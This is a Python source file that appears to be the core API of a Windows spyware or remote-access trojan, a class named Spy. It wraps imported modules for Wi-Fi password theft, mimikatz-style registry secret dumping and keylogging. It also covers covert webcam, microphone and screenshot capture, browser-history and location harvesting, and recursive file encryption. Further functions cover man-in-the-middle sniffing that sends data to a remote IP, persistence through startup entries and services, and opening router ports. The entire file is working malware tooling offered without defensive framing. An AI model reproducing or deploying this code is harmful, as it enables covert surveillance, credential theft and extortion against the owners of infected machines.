import os
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple, List

import psutil

from spying.consts import DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_SCREENSHOT_NAME, NSSM_PATH, PROTECTED_FILES, PROTECTED_DIRS, \
    SERVICE_PATHS, SERVICE_PATHS, PROJECT_NAME, OVIL_PATH, START_UP_FOLDER, ROOT_DIRECTORY, SERVICE_NAME

from spying.KeyLogger import KeyLogger
from spying.Wifi import steal_passwords
import spying.admin
from spying.startup import create_shortcut, add_to_registry_startup, remove_from_startup_registry, \
    remove_from_startup_folder
from spying.video import VideoRecorder, AudioRecorder, get_available_cameras
from pyautogui import screenshot
import geocoder
from spying.encrypt import Encryptor
from spying.MITM import netstart, filestart, stop_sniffing, is_MITM_runs
from spying.pc_passwords import get_secrets
from spying.browser import get_browser_info, list_of_history_to_str
from spying.service import secure_files, check_status, is_started, is_installed, start_service, remove_service,\
    install_service, remove_services
from spying.ports import open_port
# must be here for the pyinstaller:
from moviepy.audio.fx.audio_fadein import audio_fadein
from moviepy.audio.fx.audio_fadeout import audio_fadeout
from moviepy.audio.fx.audio_left_right import audio_left_right
from moviepy.audio.fx.audio_loop import audio_loop
from moviepy.audio.fx.audio_normalize import audio_normalize
from moviepy.audio.fx.volumex import volumex
from moviepy.video.fx.accel_decel import accel_decel
from moviepy.video.fx.blackwhite import blackwhite
from moviepy.video.fx.blink import blink
from moviepy.video.fx.colorx import colorx
from moviepy.video.fx.crop import crop
from moviepy.video.fx.even_size import even_size
from moviepy.video.fx.fadein import fadein
from moviepy.video.fx.fadeout import fadeout
from moviepy.video.fx.freeze import freeze
from moviepy.video.fx.freeze_region import freeze_region
from moviepy.video.fx.gamma_corr import gamma_corr
from moviepy.video.fx.headblur import headblur
from moviepy.video.fx.invert_colors import invert_colors
from moviepy.video.fx.loop import loop
from moviepy.video.fx.lum_contrast import lum_contrast
from moviepy.video.fx.make_loopable import make_loopable
from moviepy.video.fx.margin import margin
from moviepy.video.fx.mask_and import mask_and
from moviepy.video.fx.mask_color import mask_color
from moviepy.video.fx.mask_or import mask_or
from moviepy.video.fx.mirror_x import mirror_x
from moviepy.video.fx.mirror_y import mirror_y
from moviepy.video.fx.painting import painting
from moviepy.video.fx.resize import resize
from moviepy.video.fx.rotate import rotate
from moviepy.video.fx.scroll import scroll
from moviepy.video.fx.speedx import speedx
from moviepy.video.fx.supersample import supersample
from moviepy.video.fx.time_mirror import time_mirror
from moviepy.video.fx.time_symmetrize import time_symmetrize
import unicrypto.backends.cryptography
import unicrypto.backends.cryptography.DES
import unicrypto.backends.cryptography.TDES
import unicrypto.backends.cryptography.RC4
import unicrypto.backends.cryptography.AES

class Spy:
    """
    object that collects all the other spying methods in simple API.
    """
    def __init__(self):
        self.keyLogger: Optional[KeyLogger] = None
        self.video_recorder: Optional[VideoRecorder] = None
        self.audio_recorder: Optional[AudioRecorder] = None
        self.encryptor: Optional[Encryptor] = None

    @staticmethod
    def steal_passwords() -> str:
        """
        return the WIFI passwords saved in the computer.
        """
        return steal_passwords()

    @staticmethod
    def passwords_by_mimikatz() -> str:
        """
        return all the secrets hide in the system's registry. For example password's hashes.
        """
        return get_secrets()

    def start_keylogger(self) -> bool:
        """
        Starts the keylogger. Returns whether succeeded or not.
        """
        if self.keyLogger:
            return False
        self.keyLogger = KeyLogger()
        return self.keyLogger.start()

    def stop_keylogger(self) -> bool:
        """
        Stops the keylogger. Returns whether succeeded or not.
        """
        if not self.keyLogger:
            return False
        r = self.keyLogger.stop()
        self.keyLogger = None
        return r

    def get_keyLogger(self) -> str:
        """
        Returns the info the keylogger collected so far.
        """
        if self.keyLogger:
            return ", ".join(list(self.keyLogger.keys.queue))

    def is_keyLogger_runs(self) -> bool:
        """
        Returns whether the keyLogger steal runs or not.
        """
        return self.keyLogger is not None

    def start_video_audio_record(self, camindex=None) -> bool:
        """
        Starts to record audio and video. Returns whether succeeded or not.
        """
        if self.audio_recorder or self.video_recorder:
            return False
        self.video_recorder = VideoRecorder(camindex=camindex)
        self.audio_recorder = AudioRecorder()
        self.video_recorder.start()
        self.audio_recorder.start()
        return True

    def start_video_record(self, filename=None, camindex=None) -> bool:
        """
        Starts to record video. Returns whether succeeded or not.
        """
        if self.video_recorder:
            return False
        self.video_recorder = VideoRecorder(filename, camindex=camindex) if filename else VideoRecorder(camindex=camindex)
        self.video_recorder.start()
        return True

    def start_audio_record(self, filename=None) -> bool:
        """
        Starts to record audio. Returns whether succeeded or not.
        """
        if self.audio_recorder:
            return False
        self.audio_recorder = AudioRecorder(filename) if filename else AudioRecorder()
        self.audio_recorder.start()
        return True

    def stop_video_audio_record(self, filename=DEFAULT_VIDEO_AUDIO_NAME) -> bool:
        """
        Stops to record audio and video and joins the two. Returns whether succeeded or not.
        """
        if (not self.audio_recorder) or (not self.video_recorder):
            return False
        self.video_recorder.stop_merge(self.audio_recorder, filename)
        self.audio_recorder = None
        self.video_recorder = None
        return True

    def stop_video_record(self) -> bool:
        """
        Stops to record video. Returns whether succeeded or not.
        """
        if not self.video_recorder:
            return False
        r = self.video_recorder.stop()
        self.video_recorder = None
        return r

    def stop_audio_record(self) -> bool:
        """
        Stops to record audio. Returns whether succeeded or not.
        """
        if not self.audio_recorder:
            return False
        r = self.audio_recorder.stop()
        self.audio_recorder = None
        return r

    def is_video_audio_started(self):
        """
        Returns whether the video and audio recording have started or not.
        """
        return self.is_audio_started() and self.is_video_started()

    def is_video_started(self):
        """
        Returns whether the video recording has started or not.
        """
        return self.video_recorder is not None

    def is_audio_started(self):
        """
        Returns whether the audio recording has started or not.
        """
        return self.audio_recorder is not None

    def generate_key(self) -> str:
        """
        Creates an Encryptor object and return the key it generated.
        """
        self.encryptor = Encryptor()
        return self.encryptor.encryption_key.decode()

    # @property
    def encryption_key(self) -> str:
        """
        Returns the current encryption key.
        """
        if self.encryptor:
            return self.encryptor.encryption_key.decode()
        return self.generate_key()

    def encrypt(self, path: str, key=None) -> Tuple[list, list]:
        """
        Encrypts the all the files in the given path recursively.
        If key is passed uses the given key instead the default one.
        Returns a Tuple of two lists:
        The first list it every file it successfully encrypted.
        The second list is every file it failed to encrypt.
        """
        if not key:
            return self.encryptor.encrypt(path)
        self.encryptor = Encryptor(key)
        return self.encryptor.encrypt(path)

    def decrypt(self, path: str, key=None) -> Tuple[list, list]:
        """
        decrypts the all the files in the given path recursively.
        If key is passed uses the given key instead the default one.
        Returns a Tuple of two lists:
        The first list it every file it successfully decrypted.
        The second list is every file it failed to decrypt.
        """
        if not key:
            return self.encryptor.decrypt(path)
        e = Encryptor(key)
        return e.decrypt(path)

    @staticmethod
    def show_files(path: str) -> str:
        """
        Return all the files and directories in the given path.
        """
        return ",".join([file for file in os.listdir(path)])

    @staticmethod
    def start_sniffing_to_file(path: str, ip: str, port: int) -> bool:
        """
        Starts a MITM and saves the info to the file in the given path. creates the file if it doesn't exist
        Gets the path of the file to save the info to and the ip and the port of the communication it was called from.
        Returns whether succeeded or not
        """
        if is_MITM_runs():
            return False
        t = threading.Thread(target=filestart, args=(path, (ip, port)))
        t.start()
        return True

    @staticmethod
    def start_sniffing_on_net(ip: str, port: int):
        """
        Starts a MITM and sends the info asynchronously to given ip.
        Gets the ip and the port of the communication it was called from.
        Returns whether succeeded or not
        """
        if is_MITM_runs():
            return False
        t = threading.Thread(target=netstart, args=((ip, port), ))
        t.start()
        return True

    @staticmethod
    def stop_sniffing() -> bool:
        """
        Stops the MITM. Returns whether succeeded or not.
        """
        return stop_sniffing()

    @staticmethod
    def is_mitm_runs() -> bool:
        """
        return whether the mitm is running right now or not.
        """
        return is_MITM_runs()

    @staticmethod
    def get_available_cameras() -> str:
        return get_available_cameras()

    @staticmethod
    def get_user() -> str:
        return os.getlogin()

    @staticmethod
    def get_users() -> str:
        users = {}
        names = [n.name for n in psutil.users()]
        return str(names)

    @staticmethod
    def get_computer() -> str:
        return os.environ['COMPUTERNAME']

    @staticmethod
    def take_screenshot(path: str = DEFAULT_SCREENSHOT_NAME) -> bool:
        """
        Takes a screenshot and save it in the given path.
        :param path: where to save the file
        :return: whether succeeded
        """
        if not path.endswith(".jpg"):
            path += ".jpg"
        try:
            image = screenshot()
            image.save(path)
            image.close()
            # print("A screenshot has been taken")
        except OSError:
            # print(f"Couldn't take screenshot because {e}")
            return False
        return True

    @staticmethod
    def get_browser_info() -> List[Tuple[datetime, str]]:
        """
        Returns the browser history.
        Returns a list of tuples. Each tuple contains a datetime object and the url of the website (str).
        """
        return get_browser_info()

    @classmethod
    def get_browser_info_str(cls) -> str:
        """
        Returns the browser history in string format.
        """
        return list_of_history_to_str(cls.get_browser_info())

    @staticmethod
    def get_location():
        return geocoder.ip('me').json

    @staticmethod
    def add_to_startup_folder(path: str = OVIL_PATH) -> bool:
        """
        Crates a shortcut of the given software and puts it in the startup folder so, it starts automatically when the computer starts
        Gets the path of the software.
        Returns whether succeeded or not.
        """
        create_shortcut(str(Path(START_UP_FOLDER) / (Path(path).name + ".lnk")), path, working_dir=ROOT_DIRECTORY)
        return True

    @staticmethod
    def add_to_registry_startup(path: str = OVIL_PATH):
        """
        Adds the given software to the registry startup, so it will start automatically when the computer starts
        Gets the path of the software.
        Returns whether succeeded or not.
        """
        return add_to_registry_startup(path)

    @staticmethod
    def remove_from_startup_folder(name: str = f"{PROJECT_NAME}.exe"):
        """
        Removes the given software from the startup software.
        Gets the name of the software.
        Returns whether succeeded or not.
        """
        return remove_from_startup_folder(name)

    @staticmethod
    def remove_from_startup_registry(name: str = f"{PROJECT_NAME}.exe"):
        """
        Removes the given software from the registry startup.
        Gets the name of the software.
        Returns whether succeeded or not.
        """
        return remove_from_startup_registry(name)

    @staticmethod
    def secure_files(protected_files: List[Tuple[str, str]] = PROTECTED_FILES,
                     protected_dirs: List[Tuple[str, str]] = PROTECTED_DIRS) -> None:
        """
        Check each of the files and if it's missing tries to revive it.
        Note that protected_dirs is deprecated.
        """
        return secure_files(protected_files, protected_dirs)

    @staticmethod
    def check_status(service_name: str = SERVICE_NAME+"1", nssm_path: str = NSSM_PATH) -> Tuple[str, str]:
        """
        Checks the status of the given service.
        Return a tuple of the stdout and the stderr of the command.
        """
        return check_status(service_name, nssm_path)

    @staticmethod
    def is_started(service_name: str = SERVICE_NAME+"1", nssm_path: str = NSSM_PATH) -> bool:
        """
        Returns whether a given service is started ot not.
        """
        return is_started(service_name, nssm_path)


    @staticmethod
    def is_installed(service_name: str = SERVICE_NAME+"1", nssm_path: str = NSSM_PATH) -> bool:
        """
        Returns whether a given service is installed or not.
        """
        return is_installed(service_name, nssm_path)

    @staticmethod
    def start_service(service_name: str = SERVICE_NAME+"1", nssm_path: str = NSSM_PATH) -> Tuple[str, str]:
        """
        Starts a given service.
        """
        return start_service(service_name,nssm_path)

    @staticmethod
    def remove_service(service_name: str = SERVICE_NAME+"1", nssm_path: str = NSSM_PATH) -> tuple[tuple[str, str], Tuple[str, str]]:
        """
        Removes the given service.
        Returns the stdout and stderr of each of the stopping command and the removing command.
        """
        return remove_service(service_name, nssm_path)

    @staticmethod
    def install_service(service_name: str = SERVICE_NAME+"1", service_path: str = SERVICE_PATHS[0][0],
                        nssm_path: str = NSSM_PATH, start: bool = True,
                        override: bool = True, directory_path=None) -> str:
        """
        Installs the given service.
        :param: service_name: the name of the service to install.
        :param: service_path: the path of the service to install.
        :param: nssm_path: = the path of the nssm exe.
        :param: start: whether start the srvice after installing it.
        :param: override: if True fist removes the service with the same name and than install this one.
                otherwise, if the service is already installed, doesn't install it.
        :directory_path: the directory path of the service when loaded (the path it is called from).
        :returns: the logs of this function.
        """
        return install_service(service_name, service_path, nssm_path, start, override, directory_path)

    @staticmethod
    def remove_services(services=None, nssm_path: str = NSSM_PATH) -> None:
        """
        Loop until it removes all the services
        Returns whether succeeded or not.
        """
        if services is None:
            services = [SERVICE_NAME + "1", SERVICE_NAME + "2"]
        return remove_services(services, nssm_path)

    @staticmethod
    def open_port(port: int) -> List[Tuple[str, bool, str]]:
        """
        Opens a port in the router.
        Returns a list of every router it tryed. each item is a tuple of router ip, whether succeeded and error message.
        """
        return open_port(port)
